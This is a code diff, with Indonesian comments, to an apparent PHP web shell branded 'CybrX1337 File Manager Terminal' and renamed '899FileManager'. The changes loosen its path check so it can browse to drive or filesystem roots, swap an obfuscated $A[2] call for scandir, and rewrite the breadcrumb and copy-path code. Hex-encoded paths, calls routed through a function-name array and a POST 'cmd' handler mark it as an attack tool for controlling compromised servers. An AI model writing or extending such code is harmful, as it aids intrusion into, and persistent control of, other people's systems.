@@ -257,23 +257,49 @@ function is_binary($str)
     return preg_match('~[^\x20-\x7E\t\r\n]~', $str) > 0;
 }
 
-function is_path_safe($path, $base)
-{
-    if (!$path) return false;
-    $real_path = realpath($path);
-    if ($real_path === false) return false;
+function is_path_safe($path, $base) {
+    if (!$path || !is_string($path)) return false;
 
-    // Additional check to prevent "dot-dot" relative path bypass
-    if (strpos($path, '..') !== false) {
-        $path_norm = str_replace(['/', '\\'], [DIRECTORY_SEPARATOR, DIRECTORY_SEPARATOR], $path);
-        // This regex attempts to find any path segment that goes up and is not at the beginning of an absolute path
-        if (preg_match('/(?:^|' . preg_quote(DIRECTORY_SEPARATOR, '/') . ')\.\.(?:' . preg_quote(DIRECTORY_SEPARATOR, '/') . '|$)/', $path_norm)) {
-            // Should be handled by realpath, but a simple check is extra safe
+    // Normalisasi path: pastikan root Windows berakhir dengan '\'
+    if (stristr(PHP_OS, 'WIN')) {
+        if (preg_match('/^[A-Za-z]:$/', $path)) {
+            $path .= '\\'; // Ubah "C:" jadi "C:\"
         }
     }
 
-    // Standard safety check: ensure the resulting path is within the base directory.
-    return strncmp($real_path, $base, strlen($base)) === 0 || $base === dirname($real_path);
+    $real_path = realpath($path);
+    if ($real_path === false) {
+        // Jika realpath gagal, cek apakah ini path root yang valid
+        if (stristr(PHP_OS, 'WIN')) {
+            if (preg_match('/^[A-Za-z]:\\\\$/', $path)) {
+                $real_path = $path;
+            }
+        } else {
+            if ($path === '/' || $path === DIRECTORY_SEPARATOR) {
+                $real_path = '/';
+            }
+        }
+        if ($real_path === false) return false;
+    }
+
+    // Izinkan akses ke base_dir dan semua subdirektori
+    if (strncmp($real_path, $base, strlen($base)) === 0) {
+        return true;
+    }
+
+    // Izinkan akses eksplisit ke root filesystem jika base_dir juga di root
+    if (stristr(PHP_OS, 'WIN')) {
+        $base_drive = substr($base, 0, 3); // C:\
+        if (substr($real_path, 0, 3) === $base_drive) {
+            return true;
+        }
+    } else {
+        if ($real_path === '/' && $base === '/') {
+            return true;
+        }
+    }
+
+    return false;
 }
 
 // =================================================================
@@ -446,6 +472,24 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['save_file'])) {
 
 $path_encoded = $_GET['path'] ?? E($base_dir);
 $path = D($path_encoded);
+
+if ($path === false || !is_string($path)) {
+    $path = $base_dir;
+} else {
+    // Normalisasi root Windows
+    if (stristr(PHP_OS, 'WIN') && preg_match('/^[A-Za-z]:$/', $path)) {
+        $path .= '\\';
+    }
+    if (!is_path_safe($path, $base_dir)) {
+        $path = $base_dir;
+    } else {
+        // Gunakan $path asli jika aman, jangan selalu pakai realpath()
+        // karena realpath() bisa fail di root
+        $path = str_replace(['/', '\\'], DIRECTORY_SEPARATOR, $path);
+    }
+}
+
+$path_encoded = E($path);
 
 if (!is_path_safe($path, $base_dir) || !$A[4]($path)) {
     $path = $base_dir;
@@ -735,7 +779,7 @@ if (isset($_POST['cmd']) && !empty($_POST['cmd'])) {
 // =================================================================
 // LOGIKA TAMPILAN (FRONT-END)
 // =================================================================
-$files = $A[2]($path);
+$files = @scandir($path) ?: [];
 
 if ($files !== false) {
     usort($files, function ($a, $b) use ($path, $A) {
@@ -764,7 +808,7 @@ if ($files !== false) {
 
 <head>
     <meta charset="UTF-8" />
-    <title>PHP File Manager Terminal | CybrX1337</title>
+    <title>899FileManager</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.7/codemirror.min.css">
@@ -1263,44 +1307,67 @@ if ($files !== false) {
 
 <body>
     <div class="container">
-        <h1><i class="fa-solid fa-terminal"></i> CybrX1337 File Manager V1.2</h1>
+        <h1><i class="fa-solid fa-terminal"></i>899FileManager V1.2</h1>
         <nav class="breadcrumb" aria-label="Breadcrumb navigation" style="display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap;">
             <div style="display: flex; align-items: center; justify-content: space-between;">
             <div id="path-container" style="flex-grow: 1; min-width: 50%;">
                 <?php
-                if (strlen($path) > 1) {
-                    $currentPath = realpath($path) ?: $path;
-                } else {
-                    $currentPath = $path;
-                }
-                if (stristr(PHP_OS, 'WIN')) {
-                    $root_char = substr($currentPath, 0, 3) === '/' ? '/' : substr($currentPath, 0, 3);
-                } else {
-                    $root_char = "/";
-                }
-                $path_segments = explode(DIRECTORY_SEPARATOR, trim($currentPath, DIRECTORY_SEPARATOR));
-                $current_build_path = '';
-                echo '<a href="?path=' . E($root_char) . '">' . htmlspecialchars($root_char) . '</a>';
-                foreach ($path_segments as $segment) {
-                    if (empty($segment)) continue;
-                     if (stristr(PHP_OS, 'WIN') && substr($current_build_path, -1) !== DIRECTORY_SEPARATOR && $current_build_path !== '') {
-                        $current_build_path .= DIRECTORY_SEPARATOR;
-                    } elseif (!stristr(PHP_OS, 'WIN') && $current_build_path !== '/') {
-                        $current_build_path .= DIRECTORY_SEPARATOR;
+                    function build_breadcrumb($current_path, $base_dir) {
+                        $is_win = stristr(PHP_OS, 'WIN');
+                        $output = '';
+
+                        // Pastikan path valid dan absolut
+                        $real_path = realpath($current_path);
+                        if ($real_path === false) {
+                            $real_path = $base_dir; // fallback jika path tidak valid
+                        }
+
+                        if ($is_win) {
+                            // Ambil drive letter (misal: C:\)
+                            $drive = substr($real_path, 0, 3);
+                            $output .= '<a href="?path=' . E($drive) . '">' . htmlspecialchars($drive) . '</a>';
+
+                            // Pisahkan sisa path setelah drive
+                            $relative = substr($real_path, 3);
+                            $segments = array_filter(explode('\\', rtrim($relative, '\\')));
+                            $build = $drive;
+
+                            foreach ($segments as $seg) {
+                                $build .= $seg . '\\';
+                                $build = rtrim($build, '\\');
+                                if ($build === $real_path) {
+                                    $output .= '<span class="separator">/</span><span aria-current="page">' . htmlspecialchars($seg) . '</span>';
+                                } else {
+                                    $output .= '<span class="separator">/</span><a href="?path=' . E($build) . '">' . htmlspecialchars($seg) . '</a>';
+                                }
+                            }
+                        } else {
+                            // Linux/Unix
+                            $output .= '<a href="?path=' . E('/') . '">/</a>';
+                            $relative = ltrim($real_path, '/');
+                            $segments = $relative === '' ? [] : array_filter(explode('/', $relative));
+                            $build = '/';
+
+                            foreach ($segments as $seg) {
+                                $build .= ($build === '/' ? '' : '/') . $seg;
+                                if ($build === $real_path) {
+                                    $output .= '<span class="separator">/</span><span aria-current="page">' . htmlspecialchars($seg) . '</span>';
+                                } else {
+                                    $output .= '<span class="separator">/</span><a href="?path=' . E($build) . '">' . htmlspecialchars($seg) . '</a>';
+                                }
+                            }
+                        }
+
+                        return $output;
                     }
-                    $current_build_path .= $segment;
-                    if ($current_build_path === $currentPath || $current_build_path === $root_char) {
-                        echo '<span class="separator">/</span><span aria-current="page" data-path-segment="' . E(dirname($currentPath)) . '">' . htmlspecialchars($segment) . '</span>';
-                    } else {
-                        echo '<span class="separator">/</span><a href="?path=' . E($current_build_path) . '">' . htmlspecialchars($segment) . '</a>';
-                    }
-                }
-                ?>
+
+                    echo build_breadcrumb($path, $base_dir);
+                    ?>
                     <button id="copy-path-btn" style="color:#4fc3f7; font-weight:600; background:#37474f; margin-left: 10px; padding:5px 10px; border-radius:6px; text-decoration:none;">
                         Copy Path
                     </button>
                     <textarea id="hidden-path-value" style="position: absolute; left: -9999px;"></textarea>
-            </div>
+                </div>
             </div>
             <div style="flex-shrink: 0; margin-top: 5px;">
             <a href="?path=<?php echo E($base_dir); ?>" style="color:#4fc3f7; font-weight:600; background:#37474f; padding:5px 10px; border-radius:6px; text-decoration:none;">
@@ -1446,43 +1513,41 @@ if ($files !== false) {
     }
 
         function copyPath() {
-        const pathContainer = document.getElementById('path-container');
-        const pathLinks = pathContainer.querySelectorAll('a');
-        
-        let fullPath = '';
-        const fullHexPathData = pathContainer.querySelector('[data-path-segment]');
-        let hexPath = '';
-        let finalSegment = '';
-
-        if (fullHexPathData) {
-            hexPath = fullHexPathData.getAttribute('data-path-segment');
-            fullPath = hexToString(hexPath);
-            
-            const finalSegmentElement = pathContainer.querySelector('[aria-current="page"]');
-            if (finalSegmentElement) {
-                finalSegment = finalSegmentElement.textContent.trim();
-                if (!fullPath.endsWith('/') && !finalSegment.startsWith('/')) {
-                    fullPath += '/';
+                const container = document.getElementById('path-container');
+                let path = '';
+                
+                // Ambil root
+                const rootLink = container.querySelector('a');
+                if (rootLink) {
+                    const hex = new URLSearchParams(rootLink.href.split('?')[1]).get('path');
+                    path = hexToString(hex);
                 }
-                fullPath += finalSegment;
+                
+                // Tambahkan segmen aktif
+                const activeSegments = container.querySelectorAll('a:not(:first-child), span[aria-current="page"]');
+                for (const seg of activeSegments) {
+                    const segText = seg.textContent.trim();
+                    if (segText) {
+                        if (path.endsWith('/') || path.endsWith('\\')) {
+                            path += segText;
+                        } else {
+                            path += (stristr(navigator.platform, 'Win') ? '\\' : '/') + segText;
+                        }
+                    }
+                }
+
+                function stristr(haystack, needle) {
+                    return haystack.toLowerCase().includes(needle.toLowerCase());
+                }
+
+                if (navigator.clipboard) {
+                    navigator.clipboard.writeText(path).catch(err => {
+                        fallbackCopy(path);
+                    });
+                } else {
+                    fallbackCopy(path);
+                }
             }
-
-        } else {
-            fullPath = "Error: Tidak dapat menemukan path lengkap untuk disalin. Harap periksa struktur data-path-segment.";
-        }
-
-
-        if (navigator.clipboard) {
-            navigator.clipboard.writeText(fullPath).then(() => {
-                // Tidak ada notifikasi disini
-            }).catch(err => {
-                console.error('Gagal menyalin menggunakan navigator.clipboard: ', err);
-                fallbackCopy(fullPath);
-            });
-        } else {
-            fallbackCopy(fullPath);
-        }
-    }
 
     function fallbackCopy(text) {
         const hiddenInput = document.getElementById('hidden-path-value');
